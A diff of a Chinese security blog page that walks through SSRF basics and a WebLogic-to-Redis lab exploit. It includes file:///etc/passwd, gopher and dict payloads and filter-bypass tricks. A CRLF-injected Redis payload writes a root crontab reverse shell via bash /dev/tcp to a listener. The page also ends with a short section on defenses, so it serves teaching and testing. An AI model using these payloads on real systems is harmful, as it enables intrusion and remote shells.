@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="0x00 SSRF简介和原理 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成">
+    <meta name="description" content="0x00 SSRF简介和原理 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造">
 <meta property="og:type" content="article">
 <meta property="og:title" content="浅谈SSRF 加redis反弹shell">
 <meta property="og:url" content="https://godzeo.github.io/2020/03/22/%E6%B5%85%E8%B0%88SSRF%20%E5%8A%A0redis%E5%8F%8D%E5%BC%B9shell/index.html">
 <meta property="og:site_name" content="Zeo 安全实验室">
-<meta property="og:description" content="0x00 SSRF简介和原理 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成">
+<meta property="og:description" content="0x00 SSRF简介和原理 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200322104714726.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200322104735953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
@@ -23,9 +23,10 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200322105157613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200322105240681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-03-22T02:53:07.000Z">
-<meta property="article:modified_time" content="2020-07-04T09:00:05.503Z">
+<meta property="article:modified_time" content="2020-08-01T08:32:04.985Z">
 <meta property="article:author" content="Zeo">
 <meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="内网">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="二进制">
@@ -64,6 +65,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.0"></head>
 
@@ -159,7 +162,7 @@
       
     <div class="article-category">
         <i class="fas fa-archive"></i>
-        <a class="category-link" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a>
+        <a class="category-link" href="/categories/WEB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB漏洞复现和分析</a>
     </div>
 
 
@@ -171,6 +174,7 @@
 
   <div class="content" itemprop="articleBody">
     <a id="more"></a>
+
 
 
 <h1 id="0x00-SSRF简介和原理"><a href="#0x00-SSRF简介和原理" class="headerlink" title="0x00 SSRF简介和原理"></a>0x00 SSRF简介和原理</h1><ul>
@@ -201,30 +205,30 @@
 <p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>
 <p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
 <h1 id="0x03漏洞验证"><a href="#0x03漏洞验证" class="headerlink" title="0x03漏洞验证"></a>0x03漏洞验证</h1><p>1、排除法：浏览器f12查看源代码看是否是在本地进行了请求</p>
-<p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p>
+<p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php\?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php\?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p>
 <p>2、dnslog等工具进行测试，看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</p>
 <p>3、抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p>
-<p>​    3.1、从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p>
-<p>​    3.2、通过二级域名暴力猜解工具模糊猜测内网地址</p>
-<p>​    3.3、通过file协议读取内网信息获取相关地址</p>
+<p>​ 3.1、从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p>
+<p>​ 3.2、通过二级域名暴力猜解工具模糊猜测内网地址</p>
+<p>​ 3.3、通过file协议读取内网信息获取相关地址</p>
 <p>4、直接返回的Banner、title、content等信息</p>
 <p>5、留意布尔型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</p>
 <h1 id="0x04简单的测试用例"><a href="#0x04简单的测试用例" class="headerlink" title="0x04简单的测试用例"></a>0x04简单的测试用例</h1><h3 id="创建一个PHP测试脚本，利用curl发送请求"><a href="#创建一个PHP测试脚本，利用curl发送请求" class="headerlink" title="创建一个PHP测试脚本，利用curl发送请求"></a>创建一个PHP测试脚本，利用curl发送请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP</span><br><span class="line">$ch &#x3D; curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0); </span><br><span class="line"></span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="利用的多种协议"><a href="#利用的多种协议" class="headerlink" title="利用的多种协议"></a>利用的多种协议</h3><h4 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用gopher协议来查看协议，</span><br><span class="line">访问：http:&#x2F;&#x2F;localhost&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6667&#x2F;_godzzz</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20200322104714726.png" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200317165932247.png&quot; alt=&quot;image-20200317165932247&quot; style=&quot;zoom:50%;&quot; /&gt;"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200322104714726.png" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用gopher发送POST的请求，</span><br><span class="line">访问：http:&#x2F;&#x2F;localhost&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6667&#x2F;_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://img-blog.csdnimg.cn/20200322104735953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h4 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict 协议探测版本</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:3306&#x2F;</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://img-blog.csdnimg.cn/20200322104817808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <p>FILE协议</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
 
 <p>http/https协议</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;ip:port</span><br></pre></td></tr></table></figure>
-
-
 
 <h1 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h1><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
 <h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><ul>
@@ -236,8 +240,6 @@
 <p>docker-compose.yml</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version: &#39;2&#39;</span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">   image: vulhub&#x2F;weblogic</span><br><span class="line">   depends_on:</span><br><span class="line">    - redis</span><br><span class="line">   ports:</span><br><span class="line">    - &quot;7001:7001&quot;</span><br><span class="line"> redis:</span><br><span class="line">   build: .</span><br></pre></td></tr></table></figure>
 
-
-
 <p>编译及启动测试环境</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
@@ -247,19 +249,19 @@
 <p>1.比如探测自己的 7001端口，这是存在的</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/2020032210495411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200317214058386.png&quot; alt=&quot;image-20200317214058386&quot; style=&quot;zoom:50%;&quot; /&gt;"></p>
+<p><img src="https://img-blog.csdnimg.cn/2020032210495411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p>
 <p>2.比如这个 探测 172.19.0.2:6379是否开放，这种报错就是开放的</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20200322105012614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200317211339515.png&quot; alt=&quot;image-20200317211339515&quot; style=&quot;zoom:50%;&quot; /&gt;"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200322105012614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p>
 <p>2.比如这个 探测 127.0.0.1:7000是否开放，这种报错就是不存在的端口</p>
-<p><img src="https://img-blog.csdnimg.cn/20200322105029385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="&lt;img src=&quot;/Users/zy/Library/Application Support/typora-user-images/image-20200317213926045.png&quot; alt=&quot;image-20200317213926045&quot; style=&quot;zoom:50%;&quot; /&gt;"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200322105029385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p>
 <h3 id="攻击redis（通过header-CRLF-注入）"><a href="#攻击redis（通过header-CRLF-注入）" class="headerlink" title="攻击redis（通过header CRLF 注入）"></a><strong>攻击redis（通过header CRLF 注入）</strong></h3><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p>
 <h4 id="查看docker-redis的ip地址"><a href="#查看docker-redis的ip地址" class="headerlink" title="查看docker redis的ip地址"></a><strong>查看docker redis的ip地址</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line"></span><br><span class="line">docker exec -it c5e88c76db40 ip addr</span><br><span class="line"></span><br><span class="line">172.19.0.2是docker redis的内网地址</span><br></pre></td></tr></table></figure>
 
-<p> <img src="https://img-blog.csdnimg.cn/20200322105119457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-A7ZX0fPU-1584844899988)(/Users/zy/Library/Application Support/typora-user-images/image-20200317210632447.png)\]"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200322105119457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-A7ZX0fPU-1584844899988)(/Users/zy/Library/Application Support/typora-user-images/image-20200317210632447.png)]"></p>
 <h4 id="利用SSRF漏洞探测内网redis是否开放"><a href="#利用SSRF漏洞探测内网redis是否开放" class="headerlink" title="利用SSRF漏洞探测内网redis是否开放"></a>利用SSRF漏洞探测内网redis是否开放</h4><p>发现redis存在</p>
-<p><img src="https://img-blog.csdnimg.cn/20200322105157613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-AK6eRaxz-1584844899989)(/Users/zy/Library/Application Support/typora-user-images/image-20200317211405238.png)\]"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200322105157613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-AK6eRaxz-1584844899989)(/Users/zy/Library/Application Support/typora-user-images/image-20200317211405238.png)]"></p>
 <h4 id="payload生成"><a href="#payload生成" class="headerlink" title="payload生成"></a>payload生成</h4><p>发送三条redis命令，将弹shell脚本写入<code>/etc/crontab</code>：</p>
 <p>写成计划任务，然后反弹shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.0.1&#x2F;21 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
@@ -268,14 +270,12 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure>
 
 <p>注意，换行符是“\r\n”，也就是“%0D%0A”。</p>
-<h4 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a><strong>实施攻击</strong></h4><p>本机监听端口：nc -lvvp 2333 </p>
+<h4 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a><strong>实施攻击</strong></h4><p>本机监听端口：nc -lvvp 2333</p>
 <p>注意IP要填对</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp 这个肯定是weblogic的能访问的地方了</span><br><span class="line"></span><br><span class="line">operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379&#x2F;  这个是redis的IP和端口</span><br><span class="line"></span><br><span class="line">最后一个ip</span><br><span class="line">192.168.0.100%2F2333  这个是要反弹shell的主机ip和端口</span><br></pre></td></tr></table></figure>
 
 <p>浏览器访问：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.100%2F2333%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure>
-
-
 
 <p>反弹shell成功！<br><img src="https://img-blog.csdnimg.cn/20200322105240681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h1 id="0x06-绕过技术"><a href="#0x06-绕过技术" class="headerlink" title="0x06 绕过技术"></a>0x06 绕过技术</h1><h4 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h4><p><strong>1.@</strong></p>
@@ -285,7 +285,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::]:80&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure>
 
 <p><strong>3.利用短网址</strong></p>
-<p>站长工具短网址(<a href="http://tool.chinaz.com/tools/dwz.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/dwz.aspx</a>)<br>跳转要去的地址</p>
+<p>站长工具短网址(<a href="http://tool.chinaz.com/tools/dwz.aspx\" target="_blank" rel="noopener">http://tool.chinaz.com/tools/dwz.aspx\</a>)<br>跳转要去的地址</p>
 <p><strong>4.利用特殊域名</strong><br>原理是DNS解析。xip.io可以指向任意域名，即</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1.xip.io，可解析为127.0.0.1</span><br></pre></td></tr></table></figure>
 
@@ -299,8 +299,6 @@
 <p><strong>8.句号</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure>
 
-
-
 <h4 id="2、常见限制"><a href="#2、常见限制" class="headerlink" title="2、常见限制"></a>2、常见限制</h4><p><strong>1.限制为<a href="http://www.xxx.com/" target="_blank" rel="noopener">http://www.xxx.com</a> 域名</strong><br>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code><br><strong>2.限制请求IP不为内网地址</strong><br>当不允许ip为内网地址时<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换<br><strong>3.限制请求只为http协议</strong><br>（1）采取302跳转<br>（2）采取短地址</p>
 <h1 id="0x07-审计php常见的函数"><a href="#0x07-审计php常见的函数" class="headerlink" title="0x07 审计php常见的函数"></a>0x07 审计php常见的函数</h1><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p>
 <p>（1）file_get_contents() 函数从用户指定的url获取内容，并展示给用户。</p>
@@ -310,12 +308,8 @@
 <p>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) &#123; </span><br><span class="line">    $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30);   </span><br><span class="line">    if (!$fp) &#123; </span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">    &#125; else &#123; </span><br><span class="line">        $out &#x3D; &quot;GET $link HTTP&#x2F;1.1\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Host: $host\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;\r\n&quot;; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents&#x3D;&#39;&#39;; </span><br><span class="line">        while (!feof($fp)) &#123; </span><br><span class="line">            $contents.&#x3D; fgets($fp, 1024); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        return $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-
-
 <p>（3）curl_exec() 函数用于执行指定的cURL会话</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#39;url&#39;]))&#123;</span><br><span class="line">    $link &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">    $curlobj &#x3D; curl_init();&#x2F;&#x2F; 创建新的 cURL 资源</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">    curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);&#x2F;&#x2F; 设置 URL 和相应的选项</span><br><span class="line">    $result&#x3D;curl_exec($curlobj);&#x2F;&#x2F; 抓取 URL 并把它传递给浏览器</span><br><span class="line">    curl_close($curlobj);&#x2F;&#x2F; 关闭 cURL 资源，并且释放系统资源</span><br><span class="line"></span><br><span class="line">    $filename &#x3D; &#39;.&#x2F;curled&#x2F;&#39;.rand().&#39;.txt&#39;;</span><br><span class="line">    file_put_contents($filename, $result); </span><br><span class="line">    echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
 
 <h1 id="0x08防御技术"><a href="#0x08防御技术" class="headerlink" title="0x08防御技术"></a>0x08防御技术</h1><p>1、禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和https请求<br>2、统一错误信息，防止根据错误信息判断端口状态<br>3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址<br>4、设置URL白名单或者限制内网IP</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2115#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115#toc-2</a></p>
